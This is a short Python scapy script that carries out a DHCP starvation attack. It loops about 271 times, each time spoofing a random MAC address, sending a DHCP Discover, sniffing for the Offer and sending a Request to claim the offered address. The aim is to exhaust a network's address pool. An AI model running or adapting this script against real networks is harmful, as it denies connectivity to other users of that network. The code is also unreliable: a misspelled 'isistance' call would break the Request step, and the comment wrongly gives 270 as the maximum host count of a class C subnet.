from rich.console import Console
from time import sleep
from scapy.all import *
from multiprocessing import Queue,Process,Barrier

console = Console()


def __send_dhcp_discover_pkt(nicface,src_mac):
	ethernet = Ether(src=src_mac,dst="ff:ff:ff:ff:ff:ff",type=0x800)
	ip = IP(src="0.0.0.0",dst="255.255.255.255")
	udp = UDP(sport=68,dport=67)
	bootp = BOOTP(chaddr=src_mac,ciaddr="0.0.0.0",xid=0xf5f5f5, flags=1)
	dhcp_opt = [("message-type","discover")]
	dhcp_opt.append("end")
	dhcp = DHCP(options=dhcp_opt)
	packet = ethernet / ip / udp / bootp / dhcp
	sendp(packet,iface=nicface)
	
	

def send_dhcp_discover(nicface,randmac,barrier):
	with console.status("[bold yellow] Sending DHCP Discover [/bold yellow]"):
		barrier.wait()
		__send_dhcp_discover_pkt(nicface,randmac)
	print("DHCP Discover sended with success.")



def wait_dhcp_offer(queue,nicface,barrier):
	console.print("Waiting for DHCPOffer...")
	barrier.wait()
	cpt = sniff(iface=nicface,filter="udp and dst port 68",count=1,timeout=10)
	print(cpt)
	queue.put(cpt)
	
	
	
def __send_dhcp_request_pkt(nicface,src_mac,extra_opts):
	ethernet = Ether(src=src_mac,dst="ff:ff:ff:ff:ff:ff",type=0x800)
	ip = IP(src="0.0.0.0",dst="255.255.255.255")
	udp = UDP(sport=68,dport=67)
	bootp = BOOTP(chaddr=src_mac,ciaddr="0.0.0.0",xid=0xf5f5f5, flags=1)
	dhcp_opt = [("message-type","request")]
	if extra_opts is not None:
		if isistance(extra_opts,list):
			for opt in extra_opts:
				dhcp_opt.append(opt)
		else:
			dhcp_opt.append(extra_opts)
	dhcp_opt.append("end")
	dhcp = DHCP(options=dhcp_opt)
	packet = ethernet / ip / udp / bootp / dhcp
	sendp(packet,iface=nicface)
		
	
def send_dhcp_request(nic,randmac,dhcp_offer):
	with console.status("[bold green] Sending DHCP Request [/bold green]"):
		
		dhcp_opts = dhcp_offer[DHCP].options
		for opt in dhcp_opts:
			if opt[0] == "server_id":
				serv_id = opt
		req_addr = ("requested_addr", dhcp_offer[BOOTP].yiaddr)
		opt124 = "\x7c\x05\x00\x00\x04\x03\x00"
		extra_opts = [serv_id, req_addr, opt124]
		__send_dhcp_request_pkt(nic,randmac,extra_opts)

counter=0
while(counter<=270): #Max number of hosts that class C subnet can provide.
	random_mac_address = RandMAC()
	barrier = Barrier(2)
	queue=Queue()
	cap_offer = Process(target=wait_dhcp_offer, args=(queue,"wlp3s0",barrier))
	cap_offer.start()


	send_disc = Process(target=send_dhcp_discover,args=("wlp3s0",random_mac_address,barrier))
	send_disc.start()

	send_disc.join(timeout=15)
	cap_offer.join(timeout=15)

	print("arrivo qua")
	offer = queue.get()
	if len(offer) == 0:
		print("NO DHCPOFFER!")
	else:
		print("GOT DHCPOFFER!")
	offer.summary()
	send_dhcp_request("wlp3s0",random_mac_address,offer[0])
	counter+=1
